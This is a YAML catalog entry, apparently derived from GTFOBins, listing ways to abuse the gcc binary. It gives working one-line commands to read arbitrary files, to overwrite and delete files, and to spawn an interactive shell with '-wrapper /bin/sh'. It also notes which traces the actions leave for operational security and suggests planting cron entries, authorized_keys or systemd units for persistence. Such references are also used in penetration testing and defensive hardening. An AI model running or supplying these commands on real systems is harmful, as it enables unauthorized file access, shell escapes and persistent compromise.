---
name: gcc
capabilities:
- exec
- spawn
- read
- write
required_permissions:
  level: user
difficulty: low
opsec:
  noise: medium
  artifacts:
  - ~/.bash_history
  - Process arguments visible in ps and auditd
  - File timestamps / inotify events on target paths
  notes: ''
persistence_potential: true
examples:
- id: file-read
  description: Read an arbitrary file.
  capabilities:
  - read
  command: gcc -x c -E /path/to/input-file
- id: file-read-2
  description: Read an arbitrary file.
  capabilities:
  - read
  command: gcc @/path/to/input-file
  notes: The file is read and parsed as a list of files (one per line), the content is displayed as error messages.
- id: file-write
  description: Write content to an arbitrary file.
  capabilities:
  - write
  command: gcc -x c /dev/null -o /path/to/input-file
  notes: This actually deletes the file.
- id: shell
  description: Spawn an interactive shell.
  capabilities:
  - spawn
  - exec
  command: gcc -wrapper /bin/sh,-s x
  notes: In some older versions, the `x` argument must instead reference any existing file.
references:
- https://gtfobins.github.io/gtfobins/gcc/
tags: []
persistence_notes: Combine with write/exec primitives to drop cron entries, authorized_keys, or systemd units.
---
